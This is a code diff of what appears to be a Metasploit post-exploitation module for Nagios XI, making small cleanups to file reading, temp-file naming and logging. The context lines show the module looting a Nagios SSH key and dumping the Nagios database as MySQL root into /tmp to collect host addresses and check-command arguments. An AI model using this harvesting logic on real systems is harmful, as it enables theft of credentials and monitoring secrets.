@@ -36,7 +36,7 @@
 
       begin
         buf = read_file(file)
-        buf = '' if buf =~ /No such file or directory/
+        buf = '' if buf.include? 'No such file or directory'
       rescue ::Timeout::Error => e
         tries += 1
         if tries < 3
@@ -125,11 +125,10 @@
       print_status("Nagios SSH key stored in #{ssh_key_loot}")
 
       print_status('Attempting to dump Nagios DB')
-      db_dump_file  = '/tmp/'
-      db_dump_file << [*('a'..'z'),*('A'..'Z')].shuffle[0,8].join.to_s
+
+      db_dump_file  = "/tmp/#{Rex::Text.rand_text_alpha(6)}"
 
       sql_query  =  %Q|mysql -u root -p#{datastore['DB_ROOT_PWD']} -e "|
-      print_good(sql_query)
       sql_query <<  %Q|SELECT nagios_services.check_command_object_id, nagios_hosts.address, REPLACE(nagios_services.check_command_args,'\\"','%22') FROM nagios.nagios_hosts |
       sql_query <<  %Q|INNER JOIN nagios.nagios_services on nagios_hosts.host_object_id=nagios_services.host_object_id |
       sql_query <<  %Q|INNER JOIN nagios.nagios_commands on nagios_commands.object_id = nagios_services.check_command_object_id |
